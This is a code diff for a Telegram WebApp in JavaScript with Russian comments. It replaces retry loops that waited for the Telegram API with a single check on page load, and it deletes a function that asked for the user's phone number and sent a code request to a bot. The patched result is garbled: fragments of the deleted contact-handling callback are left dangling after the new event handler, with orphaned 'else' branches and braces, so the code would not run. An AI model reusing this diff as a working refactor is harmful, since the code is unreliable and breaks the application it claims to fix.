@@ -1,52 +1,34 @@
-// Функция запроса номера телефона через Telegram WebApp
-function requestPhoneNumber() {
-    showDebugInfo('🔍 Проверяем Telegram WebApp API...');
+// Проверка Telegram WebApp API при загрузке страницы
+document.addEventListener('DOMContentLoaded', function() {
+    showDebugInfo('🔍 Проверяем Telegram WebApp API при загрузке...');
     
-    // Ждем загрузки Telegram WebApp API
-    let attempts = 0;
-    const maxAttempts = 10;
-    
-    const checkAndRequestContact = () => {
-        attempts++;
-        showDebugInfo(`🔍 Попытка ${attempts}/${maxAttempts}: window.Telegram = ${window.Telegram ? 'ЕСТЬ' : 'НЕТ'}`);
-        
-        if (window.Telegram && window.Telegram.WebApp) {
-            showDebugInfo('✅ Telegram WebApp API доступен!');
-            
-            // Инициализируем WebApp
-            window.Telegram.WebApp.ready();
-            window.Telegram.WebApp.expand();
-            
-            // Запрашиваем номер телефона
-            window.Telegram.WebApp.requestContact((contact) => {
-                showDebugInfo('📱 Получен контакт: ' + (contact ? 'ДА' : 'НЕТ'));
-                if (contact && contact.phone_number) {
-                    // Сохраняем номер
-                    localStorage.setItem('phoneNumber', contact.phone_number);
-                    
-                    // Отправляем запрос на отправку кода боту
-                    sendCodeToBot(contact.phone_number);
-                    
-                    // Переходим на страницу ввода кода
-                    window.location.href = 'code-verification.html';
-                } else {
-                    alert('❌ Не удалось получить номер телефона');
-                }
-            });
-            return;
-        }
-        
-        if (attempts < maxAttempts) {
-            showDebugInfo('⏳ Ждем загрузки Telegram WebApp API...');
-            setTimeout(checkAndRequestContact, 100);
-        } else {
-            showDebugInfo('❌ Telegram WebApp API не загрузился за 1 секунду');
-            alert('❌ Это приложение работает только в Telegram!');
-        }
-    };
-    
-    // Начинаем проверку
-    checkAndRequestContact();
+    // Проверяем, что Telegram WebApp API доступен
+    if (window.Telegram && window.Telegram.WebApp) {
+        showDebugInfo('✅ Telegram WebApp API доступен!');
+        // Инициализируем WebApp
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    } else {
+        showDebugInfo('❌ Telegram WebApp API недоступен');
+    }
+});        showDebugInfo('📱 Получен контакт: ' + (contact ? 'ДА' : 'НЕТ'));
+            if (contact && contact.phone_number) {
+                // Сохраняем номер
+                localStorage.setItem('phoneNumber', contact.phone_number);
+                
+                // Отправляем запрос на отправку кода боту
+                sendCodeToBot(contact.phone_number);
+                
+                // Переходим на страницу ввода кода
+                window.location.href = 'code-verification.html';
+            } else {
+                alert('❌ Не удалось получить номер телефона');
+            }
+        });
+    } else {
+        showDebugInfo('❌ Telegram WebApp API недоступен');
+        alert('❌ Это приложение работает только в Telegram!');
+    }
 }
 
 // Функция отправки запроса на код боту
@@ -126,30 +108,13 @@ function showDebugInfo(message) {
 document.addEventListener('DOMContentLoaded', function() {
     showDebugInfo('🔍 Проверяем Telegram WebApp API при загрузке...');
     
-    // Ждем загрузки Telegram WebApp API
-    let attempts = 0;
-    const maxAttempts = 10;
-    
-    const checkTelegramAPI = () => {
-        attempts++;
-        showDebugInfo(`🔍 Попытка ${attempts}/${maxAttempts}: window.Telegram = ${window.Telegram ? 'ЕСТЬ' : 'НЕТ'}`);
-        
-        if (window.Telegram && window.Telegram.WebApp) {
-            showDebugInfo('✅ Telegram WebApp API доступен!');
-            // Инициализируем WebApp
-            window.Telegram.WebApp.ready();
-            window.Telegram.WebApp.expand();
-            return;
-        }
-        
-        if (attempts < maxAttempts) {
-            showDebugInfo('⏳ Ждем загрузки Telegram WebApp API...');
-            setTimeout(checkTelegramAPI, 100);
-        } else {
-            showDebugInfo('❌ Telegram WebApp API не загрузился за 1 секунду');
-        }
-    };
-    
-    // Начинаем проверку
-    checkTelegramAPI();
+    // Проверяем, что Telegram WebApp API доступен
+    if (window.Telegram && window.Telegram.WebApp) {
+        showDebugInfo('✅ Telegram WebApp API доступен!');
+        // Инициализируем WebApp
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    } else {
+        showDebugInfo('❌ Telegram WebApp API недоступен');
+    }
 });
